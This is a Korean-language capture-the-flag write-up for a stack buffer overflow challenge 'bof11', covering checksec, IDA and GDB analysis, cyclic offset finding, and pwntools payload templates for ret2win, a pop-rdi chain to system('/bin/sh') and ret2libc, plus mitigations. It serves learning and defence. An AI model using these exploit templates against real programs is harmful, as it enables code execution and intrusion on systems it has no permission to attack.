# BOF11 라이트업 - IDA + GDB 분석 흐름

## 1. 개요

BOF11은 단순히 입력을 길게 넣어 크래시를 내는 문제가 아니라, IDA로 함수 흐름을 먼저 보고 GDB에서 런타임
상태를 검증하는 방식으로 정리한 학습형 라이트업이다. 정적 분석으로 취약 후보를 좁히고, 동적 분석으로
실제 덮이는 위치와 exploit 가능성을 확인하는 데 초점을 맞췄다.

## 2. 분석 목표

| 항목 | 내용 |
| --- | --- |
| 취약점 유형 | Stack BOF / 제어 흐름 변조 |
| 정적 분석 | IDA Free, strings, xrefs, decompile view |
| 동적 분석 | GDB, pwndbg, cyclic pattern |
| exploit 방향 | ret2win 또는 ROP/ret2libc 후보 판단 |
| 핵심 포인트 | IDA 결과를 GDB에서 검증하는 습관 |

## 3. 전체 흐름

```text
checksec로 보호기법 확인
  -> IDA에서 main과 입력 함수 확인
  -> 문자열과 xref로 성공 함수 후보 확인
  -> 취약 입력 길이와 버퍼 크기 비교
  -> GDB cyclic으로 offset 확인
  -> 목표 주소 또는 ROP 체인 구성
  -> exploit.py 작성
```

## 4. 보호기법 확인

```bash
checksec ./bof11
```

보호기법에 따라 풀이 방향이 달라진다.

| 보호기법 | 의미 | 풀이 영향 |
| --- | --- | --- |
| Canary | RET 앞 변조 탐지 | leak 또는 우회 필요 |
| NX | 스택 실행 방지 | shellcode보다 ROP/ret2libc |
| PIE | 바이너리 주소 랜덤화 | base leak 필요 |
| RELRO | GOT overwrite 제한 | ROP/ret2libc로 전환 |

## 5. IDA 정적 분석

IDA에서 먼저 확인한 것은 입력 함수와 성공 조건이다.

```text
main()
  -> banner 출력
  -> vulnerable_function()
  -> 입력 수신
  -> 조건 만족 시 win()/print_flag() 호출
```

정적 분석 체크포인트:

- `gets`, `scanf("%s")`, `read`, `fgets` 길이 확인
- 지역 변수 크기와 입력 길이 비교
- `win`, `shell`, `print_flag`, `system` 문자열 xref 확인
- 함수 인자가 필요한지 확인
- 64-bit 호출 규약상 RDI/RSI/RDX 세팅이 필요한지 확인

IDA에서 취약 후보를 찾은 뒤에는 바로 exploit을 쓰지 않고, GDB에서 실제 스택 배치가 예상과 맞는지 확인했다.

## 6. GDB 동적 분석

```gdb
gdb ./bof11
pwndbg> disassemble vulnerable_function
pwndbg> break *vulnerable_function
pwndbg> run
```

입력 지점에 cyclic pattern을 넣고 크래시 후 레지스터와 스택을 확인한다.

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(200).decode())
PY
```

```gdb
pwndbg> x/20gx $rsp
pwndbg> info registers
```

offset은 `cyclic -l`로 계산한다.

```bash
cyclic -l <pattern>
```

이 과정을 통해 IDA에서 본 버퍼 크기와 실제 return address까지의 거리가 같은지 검증한다.

## 7. exploit 방향 판단

### 7.1 ret2win 가능

PIE가 꺼져 있고 `win()` 함수가 존재하면 가장 단순한 흐름은 ret2win이다.

```python
payload = b"A" * offset
payload += p64(elf.symbols["win"])
```

### 7.2 인자가 필요한 함수

성공 함수가 특정 인자를 요구하면 `pop rdi; ret` gadget을 사용한다.

```python
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(next(elf.search(b"/bin/sh")))
payload += p64(elf.symbols["system"])
```

### 7.3 ASLR/PIE가 있는 경우

주소가 랜덤화되어 있으면 leak이 먼저다.

```text
puts@got leak
  -> libc_base 계산
  -> system, "/bin/sh" 주소 계산
  -> ret2libc payload 구성
```

## 8. exploit.py 구조

```python
from pwn import *

binary = "./bof11"
elf = ELF(binary)
context.binary = elf

offset = <offset>

def start():
    if args.REMOTE:
        return remote("<host>", <port>)
    return process(binary)

p = start()

payload = b"A" * offset
payload += p64(<target_or_gadget>)

p.sendlineafter(b"> ", payload)
p.interactive()
```

실제 주소와 플래그 값은 포트폴리오에 공개하지 않고, exploit 구조와 판단 근거만 남긴다.

## 9. 실수했던 지점

- IDA에서 보이는 버퍼 크기만 보고 offset을 확정하면 saved RBP, alignment 때문에 틀릴 수 있다.
- 64-bit 환경에서는 함수 호출 전 stack alignment가 깨져 `system()` 호출이 실패할 수 있다.
- PIE가 켜져 있으면 IDA에 보이는 주소는 실제 런타임 주소가 아니므로 base 계산이 필요하다.
- `win()` 함수가 보여도 인자 조건이 있으면 단순 RET 덮기만으로는 성공하지 않는다.

## 10. 대응 방안

- 안전한 입력 함수 사용과 길이 제한
- 컴파일 보호기법 활성화: Canary, PIE, NX, RELRO
- 민감 함수나 debug/helper 함수가 릴리즈 바이너리에 남지 않도록 제거
- 크래시 로그, 비정상 길이 입력, 반복 시도를 모니터링

## 11. 학습한 점

- IDA는 “어디가 수상한지”를 찾는 도구이고, GDB는 “실제로 덮이는지”를 확인하는 도구다.
- BOF 문제는 보호기법에 따라 ret2win, ROP, ret2libc로 풀이 방향을 빠르게 바꿔야 한다.
- exploit 코드는 짧아 보여도, 그 앞의 offset 검증과 주소 판단이 대부분의 시간을 차지한다.
- 보고서에는 exploit 성공만 적는 것보다 왜 그 공격 루틴을 골랐는지 설명하는 것이 더 중요하다.
